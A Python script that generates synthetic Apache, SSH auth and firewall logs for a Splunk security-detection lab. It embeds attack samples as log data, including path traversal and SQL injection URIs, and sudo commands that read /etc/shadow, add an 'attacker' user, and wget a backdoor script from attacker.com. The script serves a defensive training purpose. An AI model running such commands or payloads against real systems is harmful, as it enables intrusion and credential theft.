#!/usr/bin/env python3
"""
Security Log Generator for Splunk Lab
Generates realistic apache, auth, and firewall logs with both normal and suspicious events
"""

import os
import random
from datetime import datetime, timedelta

def generate_apache_logs(output_file, num_events=100):
    """Generate realistic Apache access logs"""
    
    ips_internal = [f"192.168.1.{i}" for i in range(100, 110)]
    ips_external = [f"203.0.113.{i}" for i in range(1, 100)]
    
    methods = ["GET", "POST", "PUT", "DELETE"]
    uris_normal = ["/", "/index.html", "/api/users", "/login.php", "/dashboard", "/search"]
    uris_malicious = ["/admin.php", "/../../etc/passwd", "/shell.php", "/union select", "/or 1=1"]
    
    status_codes = [200, 201, 204, 301, 302, 400, 401, 403, 404, 500]
    
    base_time = datetime.now() - timedelta(hours=1)
    
    with open(output_file, 'w') as f:
        for i in range(num_events):
            # 20% malicious traffic, 80% normal
            if random.random() < 0.2:
                client_ip = random.choice(ips_external)
                uri = random.choice(uris_malicious)
                status = random.choice([400, 401, 403])
                method = "POST" if "union" in uri else "GET"
            else:
                client_ip = random.choice(ips_internal)
                uri = random.choice(uris_normal)
                status = random.choice(status_codes)
                method = random.choice(methods)
            
            timestamp = (base_time + timedelta(seconds=i*30)).strftime("%d/%b/%Y:%H:%M:%S +0000")
            bytes_sent = random.randint(100, 5000)
            
            log_line = f'{client_ip} - - [{timestamp}] "{method} {uri} HTTP/1.1" {status} {bytes_sent}'
            f.write(log_line + "\n")
    
    print(f"✓ Generated {num_events} Apache access log entries → {output_file}")

def generate_auth_logs(output_file, num_events=50):
    """Generate realistic Linux authentication logs"""
    
    ips_external = [f"203.0.113.{i}" for i in range(1, 100)]
    ips_internal = [f"192.168.1.{i}" for i in range(100, 110)]
    users = ["admin", "root", "user1", "user2", "service", "postgres"]
    hosts = ["server", "webserver", "dbserver", "appserver"]
    
    base_time = datetime.now() - timedelta(hours=1)
    
    events = []
    
    # Brute force attempts
    for i in range(15):
        timestamp = (base_time + timedelta(seconds=i*5)).strftime("%b %d %H:%M:%S")
        source_ip = random.choice(ips_external)
        target_user = random.choice(users)
        host = random.choice(hosts)
        events.append(f"{timestamp} {host} sshd[{1000+i}]: Failed password for invalid user {target_user} from {source_ip} port {54320+i} ssh2")
    
    # Successful logins
    for i in range(10):
        timestamp = (base_time + timedelta(seconds=300+i*10)).strftime("%b %d %H:%M:%S")
        source_ip = random.choice(ips_internal)
        user = "user1"
        host = random.choice(hosts)
        events.append(f"{timestamp} {host} sshd[{2000+i}]: Accepted password for {user} from {source_ip} port {54400+i} ssh2")
    
    # Privilege escalation (sudo commands)
    for i in range(5):
        timestamp = (base_time + timedelta(seconds=600+i*20)).strftime("%b %d %H:%M:%S")
        host = random.choice(hosts)
        commands = ["/bin/cat /etc/shadow", "/usr/sbin/useradd attacker", "/bin/bash", "/usr/bin/wget http://attacker.com/backdoor.sh"]
        events.append(f"{timestamp} {host} sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND={random.choice(commands)}")
    
    # Sort by timestamp (roughly)
    events.sort()
    
    with open(output_file, 'w') as f:
        for event in events:
            f.write(event + "\n")
    
    print(f"✓ Generated {len(events)} auth log entries → {output_file}")

def generate_firewall_logs(output_file, num_events=40):
    """Generate realistic firewall/IDS logs"""
    
    ips_internal = [f"192.168.1.{i}" for i in range(100, 110)]
    ips_external = [f"203.0.113.{i}" for i in range(1, 100)]
    
    trojan_ports = [4444, 5555, 6666, 8888]
    suspicious_ports = [135, 139, 445, 3389]
    
    base_time = datetime.now() - timedelta(hours=1)
    
    events = []
    
    # Blocked outbound connections (Trojan activity)
    for i in range(10):
        timestamp = (base_time + timedelta(seconds=i*30)).strftime("%Y-%m-%d %H:%M:%S")
        source_ip = random.choice(ips_internal)
        dest_port = random.choice(trojan_ports)
        events.append(f"[{timestamp}] Alert: Outbound connection blocked to 10.0.0.{random.randint(1,254)}:{dest_port} (Trojan port) from {source_ip}")
    
    # Port scans
    for i in range(8):
        timestamp = (base_time + timedelta(seconds=300+i*40)).strftime("%Y-%m-%d %H:%M:%S")
        source_ip = random.choice(ips_external)
        target_ip = random.choice(ips_internal)
        events.append(f"[{timestamp}] Alert: Port scan detected from {source_ip} to {target_ip} scanning multiple ports")
    
    # Blocked suspicious ports
    for i in range(12):
        timestamp = (base_time + timedelta(seconds=600+i*20)).strftime("%Y-%m-%d %H:%M:%S")
        source_ip = random.choice(ips_external)
        dest_port = random.choice(suspicious_ports)
        events.append(f"[{timestamp}] Alert: Attempt to connect to suspicious port {dest_port} from {source_ip} blocked")
    
    # Allowed normal traffic
    for i in range(10):
        timestamp = (base_time + timedelta(seconds=1000+i*15)).strftime("%Y-%m-%d %H:%M:%S")
        events.append(f"[{timestamp}] Allowed: DNS request to 8.8.8.8 from 192.168.1.1")
    
    events.sort()
    
    with open(output_file, 'w') as f:
        for event in events:
            f.write(event + "\n")
    
    print(f"✓ Generated {len(events)} firewall log entries → {output_file}")

def main():
    # Create directory
    log_dir = "/tmp/security_logs"
    os.makedirs(log_dir, exist_ok=True)
    
    print(f"🔒 Splunk Security Lab - Log Generator")
    print(f"📁 Creating logs in: {log_dir}\n")
    
    # Generate logs
    generate_apache_logs(f"{log_dir}/apache_access.log", num_events=100)
    generate_auth_logs(f"{log_dir}/auth.log", num_events=50)
    generate_firewall_logs(f"{log_dir}/firewall.log", num_events=40)
    
    print(f"\n✅ All logs generated successfully!")
    print(f"\n📋 Next steps:")
    print(f"   1. Start Splunk Community Edition")
    print(f"   2. Go to Settings → Data Inputs → Files & Directories")
    print(f"   3. Add input path: {log_dir}")
    print(f"   4. Create new index 'security' and monitor it")
    print(f"\n🔍 Verify with search:")
    print(f"   index=security earliest=-2h | stats count by sourcetype")

if __name__ == "__main__":
    main()
